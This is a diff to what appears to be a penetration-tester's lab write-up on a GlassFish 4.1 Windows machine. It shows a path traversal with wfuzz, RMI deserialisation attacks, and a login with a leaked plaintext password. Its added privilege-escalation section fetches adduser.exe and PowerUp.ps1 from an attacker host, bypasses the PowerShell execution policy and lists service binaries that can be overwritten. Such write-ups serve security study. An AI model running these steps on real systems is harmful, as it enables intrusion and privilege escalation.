@@ -190,7 +190,7 @@ synaman:synaman
 https://www.google.com/search?q=Glassfish+server+open+source+edition+4.1+exploit&biw=1358&bih=588&sxsrf=APq-WBuo9DzuawUxC7lyYvPjMHFIPZN0Iw%3A1644820883048&ei=k_kJYs-dAozA3LUP_PezqAk&ved=0ahUKEwiPs8-jy_71AhUMILcAHfz7DJUQ4dUDCA8&uact=5&oq=Glassfish+server+open+source+edition+4.1+exploit&gs_lcp=Cgdnd3Mtd2l6EAMyBggAEAcQHjIGCAAQBxAeOgcIABBHELADSgQIQRgASgQIRhgAUOIGWIoIYIYJaAFwAXgAgAFYiAGdAZIBATKYAQCgAQHIAQjAAQE&sclient=gws-wiz
 - https://www.exploit-db.com/exploits/39441
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
 ; for 16-bit app support
@@ -243,7 +243,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000018:   404        0 L      55 W       1082 Ch     "apache/logs/error_log"  
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ wfuzz --hc 404 -c -w windows-lfi.txt 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afFUZZ'
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -2159,13 +2159,13 @@ Requests/sec.: 0
 
 ## Java RMX Deserialisation
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/administrator/desktop/test.txt' 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>GlassFish Server Open Source Edition  4.1  - Error report</title><style type="text/css"><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - Not Found</h1><hr/><p><b>type</b> Status report</p><p><b>message</b>Not Found</p><p><b>description</b>The requested resource is not available.</p><hr/><h3>GlassFish Server Open Source Edition  4.1 </h3></body></html>                                                                                                      
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ sudo java -jar BaRMIe_v1.01.jar  -attack  192.168.90.168 7676                                                                                                 130 ⨯
 [sudo] password for kali: 
@@ -2231,7 +2231,7 @@ Select a payload to use (b to back up, q to quit): a
 Enter an OS command to execute:    
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ sudo java -jar BaRMIe_v1.01.jar  -attack  192.168.90.168 8686                                                                                                 130 ⨯
 
@@ -2275,7 +2275,7 @@ Select a target to attack (q to quit):
 
 ## SMTP Password leak
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml'
 <?xml version="1.0" encoding="UTF-8"?>
@@ -2356,7 +2356,264 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 └─$
 ```
 
+## Credential reuse
+
+`rdesktop 192.168.140.168 -u arthur -p KingOfAtlantis`
+
+![](Pasted%20image%2020220221015032.png)
 
 # Privesc
+
+https://www.google.com/search?q=Glassfish+privilege+escalation&oq=Glassfish+privilege+escalation&aqs=chrome..69i57.31643j0j7&sourceid=chrome&ie=UTF-8
+
+https://www.exploit-db.com/exploits/40438
+![](Pasted%20image%2020220221015247.png)
+
+```powershell
+C:\Program Files>sc qc domain1
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: domain1
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL                                                                                              BINARY_PATH_NAME   : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe                                          LOAD_ORDER_GROUP   :                                                                                                         TAG                : 0                                                                                                       DISPLAY_NAME       : domain1 GlassFish Server
+        DEPENDENCIES       : tcpip
+        SERVICE_START_NAME : LocalSystem
+
+C:\Program Files>cd \Users\arthur
+
+C:\Users\arthur>copy  C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe domain1Service.exe
+        1 file(s) copied.
+
+C:\Users\arthur>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+C:\Users\arthur>powershell -c wget 192.168.49.140/adduser.exe -O adduser.exe
+
+C:\Users\arthur>icacls  C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe BUILTIN\Administrators:(I)(F)
+                                                               NT AUTHORITY\SYSTEM:(I)(F)
+                                                               BUILTIN\Users:(I)(RX)
+                                                               NT AUTHORITY\Authenticated Users:(I)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\arthur>del  C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+Access is denied.
+
+C:\Users\arthur>cd C:\glassfish4\glassfish\domains\domain1\bin\
+
+C:\glassfish4\glassfish\domains\domain1\bin>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 08DF-534D
+
+ Directory of C:\glassfish4\glassfish\domains\domain1\bin
+
+10/28/2021  04:48 AM    <DIR>          .
+10/28/2021  04:48 AM    <DIR>          ..
+02/11/2022  08:44 AM                 0 domain1Service.err.log
+10/28/2021  04:15 AM            30,208 domain1Service.exe
+02/11/2022  08:44 AM                 0 domain1Service.out.log
+02/11/2022  08:44 AM               940 domain1Service.wrapper.log
+10/28/2021  04:15 AM             3,121 domain1Service.xml
+               5 File(s)         34,269 bytes
+               2 Dir(s)   4,736,839,680 bytes free
+
+C:\glassfish4\glassfish\domains\domain1\bin>cd ..
+
+C:\glassfish4\glassfish\domains\domain1>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 08DF-534D
+
+ Directory of C:\glassfish4\glassfish\domains\domain1
+
+10/28/2021  04:15 AM    <DIR>          .
+10/28/2021  04:15 AM    <DIR>          ..
+10/28/2021  04:05 AM    <DIR>          applications
+10/28/2021  04:05 AM    <DIR>          autodeploy
+10/28/2021  04:48 AM    <DIR>          bin
+10/29/2021  07:44 AM    <DIR>          config
+10/28/2021  04:15 AM    <DIR>          docroot
+10/28/2021  04:05 AM    <DIR>          init-info
+10/28/2021  04:05 AM    <DIR>          lib
+02/11/2022  08:44 AM    <DIR>          logs
+10/28/2021  04:15 AM    <DIR>          osgi-cache
+10/28/2021  04:15 AM             1,308 PlatformServices.log
+               1 File(s)          1,308 bytes
+              11 Dir(s)   4,736,839,680 bytes free
+
+C:\glassfish4\glassfish\domains\domain1>
+```
+
+## powerUp
+```powershell
+C:\Users\arthur>powershell -c wget 192.168.49.140/PowerUp.ps1 -O PowerUp.ps1
+
+C:\Users\arthur>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\arthur> . ./PowerUp.ps1
+. : File C:\Users\arthur\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more
+information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:3
++ . ./PowerUp.ps1
++   ~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+PS C:\Users\arthur> Set-ExecutionPolicy ByPass -Scope Current
+PS C:\Users\arthur> Set-ExecutionPolicy Bypass -Scope Current
+PS C:\Users\arthur> . ./PowerUp.ps1
+PS C:\Users\arthur> Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+
+[*] Checking if user is in a local group with administrative privileges...
+
+
+[*] Checking for unquoted service paths...
+
+
+[*] Checking service executable and argument permissions...
+
+
+ServiceName                     : domain1
+Path                            : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+ModifiableFile                  : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'domain1'
+CanRestart                      : False
+
+ServiceName                     : edgeupdate
+Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : AppendData/AddSubdirectory
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
+CanRestart                      : False
+
+ServiceName                     : edgeupdate
+Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
+CanRestart                      : False
+
+ServiceName                     : edgeupdatem
+Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : AppendData/AddSubdirectory
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
+CanRestart                      : False
+
+ServiceName                     : edgeupdatem
+Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
+CanRestart                      : False
+
+ServiceName                     : SecurityService
+Path                            : "C:\Program Files (x86)\TotalAV\SecurityService.exe"
+ModifiableFile                  : C:\Program Files (x86)\TotalAV\SecurityService.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : BUILTIN\Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'SecurityService'
+CanRestart                      : False
+
+ServiceName                     : SecurityService
+Path                            : "C:\Program Files (x86)\TotalAV\SecurityService.exe"
+ModifiableFile                  : C:\Program Files (x86)\TotalAV\SecurityService.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : Everyone
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'SecurityService'
+CanRestart                      : False
+
+ServiceName                     : SynaMan
+Path                            : C:\SynaMan\SynaMan.exe //RS//SynaMan
+ModifiableFile                  : C:\SynaMan\SynaMan.exe
+ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'SynaMan'
+CanRestart                      : False
+
+
+
+
+
+[*] Checking service permissions...
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+ModifiablePath    : C:\Users\arthur\AppData\Local\Microsoft\WindowsApps
+IdentityReference : FISHYYY\arthur
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\arthur\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\arthur\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+
+
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+[*] Checking for Autologon credentials in registry...
+
+
+[*] Checking for modifidable registry autoruns and configs...
+
+
+[*] Checking for modifiable schtask files/configs...
+
+
+[*] Checking for unattended install files...
+
+
+[*] Checking for encrypted web.config strings...
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+
+
+
+
+[*] Checking for cached Group Policy Preferences .xml files....
+
+
+PS C:\Users\arthur>
+
+```
 
 # Others
